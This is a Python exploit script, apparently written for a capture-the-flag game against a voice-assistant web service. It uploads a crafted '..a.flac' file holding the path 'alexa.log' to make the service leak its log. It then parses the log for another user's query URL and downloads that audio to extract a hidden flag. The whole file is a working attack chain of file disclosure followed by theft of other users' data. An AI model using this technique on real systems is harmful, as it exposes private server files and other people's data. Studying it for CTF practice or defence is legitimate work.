from lxml import html
import requests
import re
import os
import sys
sys.path.append("../alexa")
from watermarking import extractWatermark


BASE_URL = "http://localhost:8000"


# Step 1: Upload the log file leak
def uploadLogFileLeak():
	# Note that sorted() will put the filename before the file named .response.txt
	hijackedAudioFilename = "/tmp/..a.flac"
	# Paste the path to the file to be leaked into the file
	with open(hijackedAudioFilename, "w") as f:
		f.write("alexa.log")

	# Upload the hijacked audio file with suitable content type
	with open(hijackedAudioFilename, 'rb') as f:
		files = {'audioFile': (hijackedAudioFilename, f, "audio/flac")}
		response = requests.post("{}/alexa/query".format(BASE_URL), files=files)

	assert response.status_code == 200, "Alexa responded with unexpected status code"
	return response.url


# Step 2: Download the log file and find the game server's last flag
def examineLogFile(logFileLeakUrl, entryIndex=-2):
	# Access the log file
	response = requests.get(logFileLeakUrl)
	assert response.status_code == 200

	# Extract the log file
	dom = html.fromstring(response.content)
	leakedLogFileHost = dom.xpath("//div[@class=\"inner cover\"]//h3")
	assert len(leakedLogFileHost) == 1

	logLines = leakedLogFileHost[0].text.split("\n")
	postLines = [i for i, line in enumerate(logLines) if line == "\"POST /alexa/query HTTP/1.1\" 302 0"]

	# Find the get request after the second to last post request
	showFlagQuery = logLines[postLines[entryIndex] + 1]
	urlSearch = re.search("GET (/alexa/query/[0-9a-f]{32})", showFlagQuery)
	assert urlSearch is not None
	return urlSearch.group(1)


# Step 3: Download the audio file and extract the watermark
def getFlag(url):
	# Now download the audio file
	response = requests.get(BASE_URL + url)
	assert response.status_code == 200

	# Find the audio source
	dom = html.fromstring(response.content)
	audioSourceElements = dom.xpath("//audio/source[@src]")
	assert len(audioSourceElements) == 1

	audioSourceUrl = audioSourceElements[0].attrib['src']
	audioUrlFilename = audioSourceUrl.rsplit('/', 1)[-1]

	# Download the audio source
	downloadedAudioFile = "/tmp/" + audioUrlFilename
	audioUrl = BASE_URL + audioSourceUrl
	with open(downloadedAudioFile, "wb") as f:
		response = requests.get(audioUrl, stream=True)

		if response.ok:
			for block in response.iter_content(1024):
				f.write(block)
	assert response.ok

	# Extract the watermark
	return extractWatermark(downloadedAudioFile)


if __name__ == "__main__":
	logFileLeakUrl = uploadLogFileLeak()
	flagUrl = examineLogFile(logFileLeakUrl)
	flag = getFlag(flagUrl)
	print(flag)
